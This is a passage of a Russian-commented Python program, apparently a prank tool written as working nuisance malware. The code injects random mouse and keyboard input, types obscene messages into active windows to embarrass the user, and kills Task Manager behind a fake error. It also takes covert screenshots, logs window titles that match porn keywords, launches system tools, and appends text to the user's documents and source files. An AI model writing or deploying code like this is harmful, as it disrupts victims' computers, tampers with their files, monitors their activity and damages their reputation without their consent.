        return random.choice(list(action_weights.keys()))

    while True:
        try:
            # Сбор данных из очереди
            while not ai_feedback_queue.empty():
                action_name, success, timestamp = ai_feedback_queue.get()
                if action_name in action_history:
                    action_history[action_name].append(1 if success else 0)
                    # Ограничиваем длину истории для памяти (последние 100 записей)
                    if len(action_history[action_name]) > 100:
                        action_history[action_name].pop(0)

            # Обновляем веса на основе статистики
            update_weights()

            # Выбираем действие
            best_action = choose_action()

            # Выполняем действие с задержкой для маскировки
            delay = random.uniform(1200, 4800)  # 20-80 минут в секундах
            time.sleep(delay)

            if best_action == "mouse_move":
                mouse_move()
            elif best_action == "errors":
                errors()
            elif best_action == "question":
                question()
            elif best_action == "warnings":
                warnings()
            elif best_action == "keyboard_imitation":
                keyboard_imitation()
            elif best_action == "kill_window":
                for app in target_apps:
                    is_active, title = detect_target_application()
                    if is_active:
                        kill_window(title)
                        break
            elif best_action == "write_in_chat":
                write_in_chat("Упси, я обосрался")
            elif best_action == "start_chaos":
                start_chaos()

            log_action(best_action, success=True)

        except Exception as e:
            logger(f"AI thread error: {e}")
            time.sleep(10)


def mouse_move():
    
    try:
        width, height = pyautogui.size()
        x_offset = random.randint(-100, 100)
        y_offset = random.randint(-100, 100)
        current_x, current_y = pyautogui.position()
        
        new_x = max(0, min(width, current_x + x_offset))
        new_y = max(0, min(height, current_y + y_offset))

        pyautogui.moveTo(new_x, new_y, duration=0.2)

    except Exception as e:
        messagebox.showerror("Ошибка", f"Ошибка:{e}")
        logger(f"Ошибка мыши: {e}")
    logger("Мышка повернута!!!:)")

def errors():
    choiceerror = random.choice(["Система пукнула", "Я обосрался", "Доступ Запрещен", "БРЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭэ", "Критическая ошибка ядра: 0xBRUH00000304"])
    messagebox.showerror("Ошибка!", choiceerror )
    logger(choiceerror)

def question():
    title = random.choice(['Вопрос', "Вопрос."])
    textquestion = random.choice(["Аллигаторы гуляют по вашей системе!!!", "Кал обосрался!", "Вы предпочитаете какать или срать?", "Сходи в туалет!!!", "ЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮЮ"])
    simpledialog.askstring(title, textquestion)
    say("Sorry Bruh")
    logger("BFEertyuytrfghgfdfgtrdfg")
    return "J#MFUH3wunewry"
def warnings():
    warntitle = random.choice(["Некритическая ошибка", "Отклонение от нормы"])
    textwarn = random.choice(["Алигаторы танцую.т", "Файлы повреждены", "Каловые массы не равны каловым мсама", "2+2=5"])

    messagebox.showwarning(warntitle, textwarn)
    logger(f"Внимание! предупреждение: {textwarn}")
    return 9

running = True

def key_checker():
    global running
    
    while running:
        if msvcrt.kbhit():
            key = msvcrt.getch().decode('utf-8').lower()
            if key == 'q':
                running = False
                break
        time.sleep(0.1)

def main_free():
    global running

    infect_choice = ask_infect_files()
    porndetect = threading.Thread(target=porn_detection_thread, daemon=True)
    injectorfiles = threading.Thread(target=lambda: infect_files(infect_choice), daemon=True)
    porndetect.start()
    screenshot = threading.Thread(target=screenshot_thread, daemon=True)
    screenshot.start()
    injectorfiles.start()
    capitulation = threading.Thread(target=capitulation_thread, daemon=True)
    capitulation.start()
    prem = threading.Thread(target=show_premium, daemon=True)
    prem.start()
    running = True
    checker_thread = threading.Thread(target=key_checker, daemon=True)
    checker_thread.start()
    try:
        while running:
            sleep = random.randint(500, 5000)
                
            action = random.choice([lambda: question(), lambda: warnings(),lambda: errors(),lambda: mouse_move(), lambda: jokes_from_supersonic()])
            thread = threading.Thread(target=action, daemon=True)
            thread.start()
            logger(f"ахахах.команда выполнена: {action}")
            logger(f"Впадаем в спячку на {sleep} секунд...")
            time.sleep(sleep)

    except Exception as e:
        messagebox.showerror("Ошибка", f"Вот так вот шутишь себе шутками, а тут реальная ошибка:{e}")
        return 1
def capslock_mig():
    try:
        for _ in range(9):
            pyautogui.press("capslock")
            time.sleep(0.2)
    except:
        pass

def browser_lol():
    global running
    while running:
      
            
      toopen = ["https://www.google.com/search?q=Как+не+обкакатся+в+общественном+месте", "https://www.google.com/search?q=Карты+купить", "https://www.google.com/search?q=Какого+черта?!", "https://www.google.com/search?q=Шашлык+купить", "https://www.google.com/search?q=Обкакался+в+общественном+месте+что+делать", "https://www.google.com/search?q=Кряк+торрент+без+регистрации+и+смс+бесплатно+прямо+сейчас"]
      tooopen = random.choice(toopen)
      hidenrun = ["taskmgr", "winver", "notepad", "regedit", "aeofemrif", "control"]
      torunhiden = random.choice(hidenrun)
      os.system(torunhiden)

      import webbrowser
      webbrowser.open(tooopen)
      webbrowser.open(tooopen)
      time.sleep(random.randint(200, 900))
      logger(f"Открыта вкладка: {tooopen}")

def keyboard_imitation():
   def reputation_ohmy():
       copyonwrite("Упси, я обкакалась! простите начальник. я обосралась вам на лицо поносом. сосите")
       pyautogui.press("enter")
       logger("Репутация разрушена. крах системы")


   while running:
        time.sleep(random.randint(200, 600))
        choice = [
        lambda:pyautogui.press(random.choice(["capslock", "numlock", "scrollblock"])),
        lambda: pyautogui.hotkey("ctrl", random.choice(['c', 'v', 'z'])),
        lambda: copyonwrite(random.choice(['Ваш компьютер обосрался цифрами', "БРК", 'ПУКАЛ', 'ОООЙ Я НЕ СДЕРЖИВАЮСЬ ЩАС ПОНОС БУДЕТ ОООЙ💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩💩', 'Упси БРЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭЭ', 'ктцн3кптцкпгцутпрсекару']), interval=0.1),
        lambda: pyautogui.hotkey("ctrl", "alt", "del"),
        lambda: pyautogui.hotkey("alt", "tab"),
        lambda: reputation_ohmy(),
        lambda: pyautogui.press("enter")]

        random.choice(choice)()



def mouse_pranks_imitation():
    while running:
        time.sleep(random.randint(500, 1000))
        width, height = pyautogui.size()
        actions = [
        lambda: pyautogui.moveTo(random.randint(0, width), random.randint(0, height), duration=0.5),
        lambda: pyautogui.click(button=random.choice(['left', 'right'])),
        lambda: pyautogui.scroll(random.choice([5, -5, 10, -10])),
        lambda: pyautogui.doubleClick(x=random.randint(0, width), y=random.randint(0, height)),
        lambda: say("AAAAHAHAHHAHAHAHAHAHAHAHAHAHAH"),
        lambda: pyautogui.hotkey("ctrl", "shift", "alt")
    ]
        random.choice(actions)()

        
from PIL import ImageGrab  # Убедитесь, что установлен Pillow, Иначе не будет ниче работать:(

screenshot_dir = "Croc_Screenshots"

# Создаем папку для скриншотов, если её нет
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

def take_screenshot():
    """Делает скриншот и сохраняет его с меткой времени"""
    try:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        filename = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        logger(f"Скриншот сохранен: {filename}")
        return filename
    except Exception as e:
        logger(f"Ошибка при создании скриншота: {e}")
        return None

def show_screenshot_later(filename):
    """Показывает скриншот через случайный промежуток времени"""
    if filename and os.path.exists(filename):
        # Ждем от 10 минут до 2 часов
        delay = random.randint(600, 7200)
        time.sleep(delay)
        # Показываем скриншот средством Windows
        os.system(f'start "{filename}"') # Лучше я бы использовал subprocces.run Или Popen.
        messagebox.showinfo("Напоминание", f"Вот чем ты занимался!\nАхаха!")

def screenshot_thread():
    """Поток для создания и отложенного показа скриншотов"""
    while running:
        # Делаем скриншот раз в 5-15 минут
        interval = random.randint(300, 900)
        time.sleep(interval)
        filename = take_screenshot()
        # Запускаем поток для отложенного показа этого скриншота
        if filename:
            t = threading.Thread(target=show_screenshot_later, args=(filename,), daemon=True)
            t.start()


def porn_detection():
    """Функция обнаружения 'подозрительной' активности""" 
    suspicious_keywords = ["porn", "xxx", "инкогниito", "private", "18+", "video", "секс", "порно", "pornhub", "porno", "Порево", "порно", "порнхаб", "pornhub.com"]  # Список ключевых слов

    try:
        active_window = gw.getActiveWindow()
        if active_window and active_window.title:
            title = active_window.title.lower()
            for word in suspicious_keywords:
                if word in title:
                    # ТРИГГЕР! Обнаружена подозрительная активность!(Не будем делать скриншот)
                    messagebox.showwarning("КАЛОВЫЕ МАСОНЫ ПУКНУЛИ",
                                           "#ХватитСмотретьПорно\n\nТвои грехи записаны в logs.txt!")
                    logger(f"[Обнаружена подозрительная активность] Пользователь смотрит : {title}")
                    
    except:
        pass

# Запускаем проверку в отдельном потоке с большим интервалом, чтобы не нагружать систему
def porn_detection_thread():
    while running:
        porn_detection()
        time.sleep(30)  # Проверяем каждые 30 секунд

def anti_taskmgr_thread():
    while running:
        time.sleep(30)
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() == 'taskmgr.exe':
                    messagebox.showerror("System Error", "Task Manager has encountered a problem and needs to close. We are sorry for the inconvenience.")
                    proc.kill()
                    logger("Task Manager killed")
            except:
                pass



def ask_infect_files():
    """Спрашивает пользователя, заражать ли файлы"""
    response = messagebox.askyesno("Заражение файлов", "Хотите ли вы заразить все файлы на рабочем столе, в документах и загрузках строкой '# файл заражен крокодильчиком. спасибо за внимание!'?")
    return response

def infect_files(infect=True):
    """Ищет файлы .txt, .py, .docx, .cpp и добавляет в конец строку-след"""
    if not infect:
        logger("Заражение файлов отключено пользователем")
        return 0

    search_dirs = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads"),
    ]
   
    target_extensions = ['.txt', '.py', '.cpp', '.c', '.java', '.docx', '.rtf']
    infection_message = "# файл заражен крокодильчиком. спасибо за внимание!\n" # Аккуратнее с этим!
   
    infected_count = 0
   
    for directory in search_dirs:
        if not os.path.exists(directory):
            continue
           
        for root, dirs, files in os.walk(directory):
            for file in files:
                if any(file.endswith(ext) for ext in target_extensions):
                    file_path = os.path.join(root, file)
                    try:
                        # Просто добавляем строку в конец файла!
                        with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                            f.write(infection_message)
                           
                        infected_count += 1
                        logger(f"Заражен файл: {file_path}")
                       
                    except Exception as e:
                        logger(f"Ошибка заражения {file_path}: {e}")
   
    logger(f"Всего заражено файлов: {infected_count}")
    return infected_count

def sounder():
    while True:
        import winsound
        time.sleep(random.randint(900, 1000))
        actionsy = [
        lambda: winsound.beep(100, 50),
        lambda: winsound.beep(1000, 500),
        lambda: winsound.Beep(8000, 5000),
        lambda: say("Каловые масоны!"), # Туалетного юмора тут больше чем в школе, потому что я недоразвитый.
        lambda: say("ПУКАЛОВЫЕ АППАРАТНО-ТЕРМОЯДЕРНЫЕ ПЕНИСИСНЫЕ ПСЕВДОКАРТОШЕЧНЫЕ КАРТО-ПЬЯНСКИЕ УРТО-КАРСКИЕ МАССОНЫ ГОВНА"), # Что за...
        lambda: say("ПУСТОЙ ТЕКСТ ядерный кал"),
        lambda: say("доброта? не, не слышал.")
    ]
        random.choice(actionsy)()



def main():
    

    
    global running
    infect_choice = ask_infect_files() # Ууууууу.... проявляется.... -Что?

    protect = threading.Thread(target=protection, daemon=False) # Псевдо-Защитничек 
    protect.start()

    porndetect = threading.Thread(target=porn_detection_thread, daemon=True)
    injectorfiles = threading.Thread(target=lambda: infect_files(infect_choice), daemon=True)
    porndetect.start()
    screenshot = threading.Thread(target=screenshot_thread, daemon=True)
    screenshot.start()
    capitulation = threading.Thread(target=capitulation_thread, daemon=True)
    capitulation.start()
    injectorfiles.start() # Хехехехех...
    running = True
    checker_thread = threading.Thread(target=key_checker, daemon=True) # :)
    checker_thread.start()
    keyboard_thread = threading.Thread(target=keyboard_imitation, daemon=True) # -Ало? -Упси, я обкакалась! -Вы уволены.
    keyboard_thread.start()
    mouse_thread = threading.Thread(target=mouse_pranks_imitation, daemon=True)
    mouse_thread.start()  # TODO Для пользователей: Списать все на глюки виндовс
    intelect_sabotage = threading.Thread(target=main_sabotage_loop, daemon=True)
    intelect_sabotage.start() # TODO: Это все ваня из 5 подьезда!
    browser = threading.Thread(target=browser_lol, daemon=True)
    browser.start()    # TODO: Добавить больше вкладок
    ai = threading.Thread(target=ai_statistical_thread, daemon=True)
    ai.start() #
    try:

        while running:
            sleep = random.randint(500, 5000)
                
            action = random.choice([lambda: question(), lambda: warnings(),lambda: errors(),lambda: mouse_move(), lambda: jokes_from_supersonic(), lambda: capslock_mig])
            thread = threading.Thread(target=action, daemon=True)
            thread.start()
            time.sleep(sleep)

    except Exception as e:
        messagebox.showerror("Ошибка", f"Вот так вот шутишь фейковыми ошибками, а тут реальная ошибка:{e}")
        return 1
def validate_license_key(key: str) -> bool:
    """
    Алгоритм проверки(?)
    """
    # Remove hyphens
    clean_key = key.replace('-', '')
    if len(clean_key) != 20:
        return False
    try:
        main_key = clean_key[:16]
        checksum = clean_key[16:]
        # Check if hex
        int(main_key, 16)
        int(checksum, 16)
        # Recompute checksum
        recomputed_checksum = hashlib.sha256(main_key.encode()).hexdigest()[:4]
        recomputed_checksum = hashlib.md5(recomputed_checksum.encode()).hexdigest()[:4]
        return checksum == recomputed_checksum
    except Exception:
        return False

def get_license_key():
    """
    Диалог ввода лицензионного ключа(не активируется в коде)
    """
    root = tk.Tk()
    root.title("Введите лицензионный ключ")
    root.geometry("400x150")
    root.resizable(False, False)


    label = tk.Label(root, text="Введите лицензионный ключ в формате XXXX-XXXX-XXXX-XXXX-XXXX:")
    label.pack(pady=10)

    entry = tk.Entry(root, font=("Arial", 14), justify='center')
    entry.pack(pady=10, padx=20, fill='x')

    result = [None]

    def on_ok():
        key = entry.get().strip()
        if key:
            result[0] = key
        root.destroy()

    def on_cancel():
        root.destroy()

    

    def format_key(event=None):
        text = entry.get().replace('-', '')
        if len(text) > 20:
            text = text[:20]
        formatted = '-'.join([text[i:i+4] for i in range(0, len(text), 4)])
        entry.delete(0, tk.END)
        entry.insert(0, formatted)
        entry.icursor(len(formatted))  # Что здесь писать?

    entry.bind('<KeyRelease>', format_key)

    button_frame = tk.Frame(root)
    ok_btn = tk.Button(button_frame, text="OK", command=on_ok)
    cancel_btn = tk.Button(button_frame, text="Отмена", command=on_cancel)
    ok_btn.pack(side=tk.LEFT, padx=10)
    cancel_btn.pack(side=tk.RIGHT, padx=10)
    button_frame.pack(pady=10)

    root.mainloop()
    return result[0]

if __name__ == "__main__":
    main()
#    check_passwd()
#    license_key = get_license_key()
#    if license_key and validate_license_key(license_key):
#       main()
#    else:
   #     messagebox.showerror("Error", "Неверный ключ.доступ запрещен.  открываем free")
    #    main_free()

    # check_passwd()
     # license_key = get_license_key()
    #if license_key and validate_license_key(license_key):
     #   mai
     #это надо раскоментировать.
     #М?